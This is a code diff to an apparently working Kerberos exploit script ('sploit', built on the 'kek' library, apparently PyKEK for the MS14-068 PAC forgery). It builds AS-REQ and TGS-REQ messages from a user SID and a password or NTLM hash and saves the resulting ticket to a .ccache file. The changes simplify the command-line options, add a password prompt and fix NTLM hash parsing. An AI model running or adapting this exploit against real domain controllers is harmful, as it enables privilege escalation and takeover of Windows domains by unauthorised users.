@@ -15,6 +15,7 @@ from kek.util import epoch2gt, gt2epoch
 
 def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host,
            output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None):
+
     sys.stderr.write('  [+] Building AS-REQ for %s...' % kdc_a)
     sys.stderr.flush()
     nonce = getrandbits(31)
@@ -40,12 +41,11 @@ def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm
     tgt_a = as_rep['ticket']
     sys.stderr.write(' Done!\n')
 
-    # debug
+
     if krbtgt_a_key is not None:
         print >> sys.sdterr, as_rep.prettyPrint()
         print >> sys.stderr, as_rep_enc.prettyPrint()
         ticket_debug(tgt_a, krbtgt_a_key)
-
     
     sys.stderr.write('  [+] Building TGS-REQ for %s...' % kdc_a)
     sys.stderr.flush()
@@ -141,40 +141,36 @@ def ticket_debug(ticket, key):
 
 if __name__ == '__main__':
     from getopt import getopt
+    from getpass import getpass
 
     def usage_and_exit():
         print >> sys.stderr, 'USAGE:'
-        print >> sys.stderr, '%s -u <userName>@<domainDnsName> -s <userSid> (-p <cleartextPassword>|--rc4 <ntlmHash>)' % sys.argv[0]
-        print >> sys.stderr, '    -a <domainController_A_DNSName> (--tgt <targetDomainDnsName>|--tgs <targetService>/<targetDnsName> -b <domainController_B_DNSName>)'
-        print >> sys.stderr, 'See README file!'
-        sys.exit(1)
-    
-    opts, args = getopt(sys.argv[1:], 'u:s:p:h:a:b:', ['rc4=','tgt=','tgs='])
+        print >> sys.stderr, '%s -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>' % sys.argv[0]
+        print >> sys.stderr, ''
+        print >> sys.stderr, 'OPTIONS:'
+        print >> sys.stderr, '    -p <clearPassword>'
+        print >> sys.stderr, ' --rc4 <ntlmHash>'
+
+    opts, args = getopt(sys.argv[1:], 'u:s:d:p:', ['rc4='])
     opts = dict(opts)
-    if not all(k in opts for k in ('-u', '-s', '-a')) or not any(k in opts for k in ('-p', '--rc4')) \
-            or (not '--tgt' in opts and (not '--tgs' or not '-b' in opts)):
+    if not all(k in opts for k in ('-u', '-s', '-d')):
         usage_and_exit()
 
     user_name, user_realm = opts['-u'].split('@', 1)
     user_sid = opts['-s']
-    kdc_a = opts['-a']
+    kdc_a = opts['-d']
 
     if '--rc4' in opts:
-        user_key = (RC4_HMAC, h.decode('hex'))
+        user_key = (RC4_HMAC, opts['--rc4'].decode('hex'))
         assert len(user_key[1]) == 16
-    else:
+    elif '-p' in opts:
         user_key = (RC4_HMAC, ntlm_hash(opts['-p']).digest())
-
-    if '--tgt' in opts:
-        target_realm = opts['--tgt']
-        target_service = target_host = kdc_b = None
-        filename = 'TGT_%s@%s_%s.ccache' % (user_name, user_realm, target_realm)
-
     else:
-        target_service, target_host = opts['--tgs'].split('/', 1)
-        target_realm = target_host.split('.', 1)[1]
-        kdc_b = opts['-b']
-        filename = 'TGS_%s@%s_%s.ccache' % (user_name, user_realm, target_host)
+        user_key = (RC4_HMAC, ntlm_hash(getpass('Password: ')).digest())
+
+    target_realm = user_realm
+    target_service = target_host = kdc_b = None
+    filename = 'TGT_%s@%s.ccache' % (user_name, user_realm)
 
     user_realm = user_realm.upper()
     target_realm = target_realm.upper()
